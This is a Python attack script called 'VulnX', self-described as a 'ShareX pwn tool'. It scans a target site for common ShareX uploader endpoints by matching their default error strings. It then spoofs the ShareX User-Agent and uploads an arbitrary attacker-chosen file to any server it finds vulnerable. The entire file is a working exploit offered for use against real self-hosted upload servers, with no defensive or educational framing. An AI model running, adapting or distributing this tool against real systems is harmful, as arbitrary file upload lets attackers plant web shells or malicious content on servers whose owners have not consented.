# VulnX - An essential ShareX pwn tool
# Author: checksum

import requests
import argparse
import os
import validators
import sys
from colorama import Fore, init

__version__ = '0.1.2'

# constants
BANNER = fr''' {Fore.WHITE}_____     _     __ __{Fore.LIGHTBLACK_EX}
|  |  |{Fore.WHITE}_ _{Fore.LIGHTBLACK_EX}| |{Fore.WHITE}___{Fore.LIGHTBLACK_EX}|  |  |
|  |  | | | |   |-   -| {Fore.LIGHTRED_EX}v{__version__}{Fore.LIGHTBLACK_EX}
 \___/|___|_|_|_|__|__| {Fore.RESET}By {Fore.LIGHTGREEN_EX}checksum {Fore.LIGHTYELLOW_EX}(@0daySkid){Fore.RESET}
'''

ENDPOINTS = ('upload.php', 'up.php', 'sharex.php')
KEYWORDS = ('File upload failed - CHMOD/Folder doesn\'t exist?', 'File not found.', 'No post data recieved')

def print_error(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTRED_EX}ERRO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')

def print_sucess(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTGREEN_EX}INFO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')

def print_info(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTBLUE_EX}INFO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')

def print_warning(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTYELLOW_EX}WARN {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')

def upload_file(url, endpoint, file_path, file_name, form_name, secret=None):
    data = {form_name: (os.path.basename(file_path), open(file_path, 'rb'), 'text/plain')}

    if secret:
        data.update({'secret': secret})

    return requests.post(url + '/' + endpoint, headers={'User-Agent': 'ShareX/13.2.1'}, files=data)

def is_online(url):
    try:
        requests.get(url)
        return True
    except:
        pass

def get_endpoint(url):
    try:
        for endpoint in ENDPOINTS:
            res = requests.get(url + '/' + endpoint)
            
            if res.text.strip() in KEYWORDS:
                return endpoint
    except:
        pass

def format_url(url, with_path=True):
    group = url.split('/')
    protocol = group[0]
    domain = group[2]
    path = ''
    
    if with_path:
        if len(group) > 3:
            for x in group[3:]:
                if not x:
                    continue
                
                if '.' in group:
                    break
                
                path += '/' + x
    
    return protocol + '//' + domain + (path if len(path) > 0 else '')

def validate_file(file):
    return os.path.exists(file) and os.path.isfile(file)

def main():
    # make command prompt support ANSI escape color codes
    if os.name == 'nt':
        init(convert=True)

    # print sexy banner
    print(BANNER)

    # create arguments
    parser = argparse.ArgumentParser(usage='%(prog)s [options]')
    parser.add_argument('-u', '--url', help='target URL', dest='url', metavar='')
    parser.add_argument('-f', '--file', help='file to upload', dest='path', metavar='')
    parser.add_argument('-s', '--secret', help='ShareX secret', dest='secret', metavar='')
    parser.add_argument('-n', '--form-name', help='Multipart file form name', dest='form_name', metavar='', default='sharex')

    args = parser.parse_args()
    
    # read arguments
    url = args.url
    file_path = args.path
    secret = args.secret
    form_name = args.form_name

    # print help if no arguments are given
    if not url and not file_path and not secret:
        parser.print_help()
        exit()

    # handle mandatory arguments
    if not url:
        print_error('target url is not provided')
        exit()

    if not file_path:
        print_error('file path is not provided')
        exit()

    # validate URL
    if not validators.url(url):
        print_error('invalid url provided')
        exit()

    # check if file exists
    if not validate_file(file_path):
        print_error('file not found')
        exit()

    # format URL
    target_url = format_url(url)
    
    # check if target is online
    if not is_online(target_url):
        print_error('target is offline')
        exit()

    print_sucess('target is online')

    # check if target is vulnerable
    endpoint = get_endpoint(target_url)

    if not endpoint:
        print_error('target is not vulnerable')
        
        if target_url.count('/') > 2:
            print_info(f'try: {Fore.LIGHTMAGENTA_EX}{format_url(target_url, False)}{Fore.RESET} as target URL')
        exit()

    print_sucess(f'target seems vulnerable: {Fore.LIGHTMAGENTA_EX}{target_url}/{endpoint}')

    # upload file
    print_info('attempting to upload file on target...')
    try:
        file_name = os.path.basename(file_path) 

        res = upload_file(target_url, endpoint, file_path, file_name, form_name, secret)
        
        code = res.status_code
        res_body = res.text.strip()

        if code == 200:
            if not res_body in KEYWORDS:
                print_sucess(f'file was successfully uploaded on target: {Fore.LIGHTMAGENTA_EX}{res_body}')
            else:
                print_error('failed to upload file')

        elif code == 403:
            print_error('target blocked the file upload')

        else:
            print_error(f'response code: {Fore.LIGHTMAGENTA_EX}{code}')
            print_error(f'response body: {Fore.LIGHTMAGENTA_EX}{res_body}')
            
        if code != 200 and target_url.count('/') > 2:
            print_info(f'try: {Fore.LIGHTMAGENTA_EX}{format_url(target_url, False)}{Fore.RESET} as target URL')

    except Exception as e:
        _, _, exc_tb = sys.exc_info()
        print_error('an error occurred while attempting to upload file to target')
        print_error(f'exception: {Fore.LIGHTMAGENTA_EX}{e}')
        print_error(f'line: {Fore.LIGHTMAGENTA_EX}{exc_tb.tb_lineno}')

if __name__ == '__main__':
    main()
